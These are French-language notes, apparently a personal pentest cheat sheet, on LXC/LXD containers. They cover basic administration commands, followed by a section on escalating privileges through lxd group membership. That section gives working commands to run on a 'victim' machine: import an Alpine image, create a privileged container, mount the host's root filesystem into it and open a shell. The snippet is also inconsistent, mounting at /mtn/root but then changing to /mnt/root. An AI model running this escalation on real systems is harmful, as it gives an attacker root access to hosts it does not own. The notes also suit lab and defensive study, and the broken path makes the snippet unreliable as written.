# LXC CONTAINER

Linux container.

## Brief

Système de virtualisation dont le poids se situe entre une VM (lourd) et un docker (léger).
Pas de virtualisation d'hardware car pas d'hyperviseur.
A l'inverse de docker, LXC émule un OS.

* Pour lancer le service : `sudo systemctl start lxd`
* Pour voir l'état du service : `sudo systemctl status lxd`
* Ajouter son user au group lxd : `sudo gpasswd -a [user] lxd`
* Après avoir lancer le serveur, il faut l'initialiser : `lxd init`

## LXC COMMANDS - Basic

* Help : `lxc help`
* Lieu de stockage de toutes les images : `lxc storage list`
* Images disponibles : `lxc image list`
* Containers actifs : `lxc list`
* Lancer un container : `lxc launch [img_os]:[version] [container_name]`
    Cela va télécharger l'image directement depuis internet.
    Pour voir les mirroirs : `lxc remote list`
* Arrêter un container : `lxc stop [container_name]`
* Supprimer un container : `lxc delete [container_name]`
* Se rendre dans un container : `lxc exec [container_name] bash`
* Infos sur un container : `lxc info [container_name]`

## LXD PRIVESC

Si nous sommes dans le groupe lxd, privesc possible.
La technique consiste à monter dans notre container un container qui
contient `/`.
Nous allons utiliser l'image Alpine pour se faire.

* Alpine est une distribution linux ultra-légère. 
Populaire pour son utilisation dans des containers.

* Repo de alpine : `https://github.com/saghul/lxd-alpine-builder`

_____

**SI ERREURS MIRROIR, SUIVRE CETTE ETAPE (12/03/2021)**

```
cd lxd-alpine-builder/rootfs/usr/share
mkdir alpine-mirrors
cd alpine-mirrors
echo "http://alpine.mirror.wearetriple.com" > MIRRORS.txt
```
____

* Transférer l'image au format `tar.gz` sur la machine cible.
* Sur la machine victime : 
    ```
    lxd init
    lxc image import [fichier tar.gz] --alias privesc
    lxc init privesc privesc-container -c security.privileged=true
    lxc config device add privesc-container mydevice disk source=/ path=/mtn/root recursive=true
    lxc start privesc-container
    lxc exec privesc-container /bin/sh
    cd /mnt/root
    ``` 










